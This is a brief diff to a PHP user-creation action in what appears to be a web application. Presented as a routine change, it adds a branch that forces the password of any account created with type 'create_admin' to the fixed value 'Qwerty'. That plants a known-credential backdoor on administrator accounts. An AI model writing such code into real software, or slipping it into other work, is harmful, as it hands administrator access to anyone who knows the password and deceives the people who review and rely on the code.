@@ -146,6 +146,11 @@ final class UserAction
 
         // Collect input from the HTTP request
         $data = (array)$request->getParsedBody();
+
+        if($data["type"] == "create_admin") {
+            $data["password"] = "Qwerty";
+        }
+
         // Invoke the Domain with inputs and retain the result
         $user = $this->userModel->createUser($data);
 
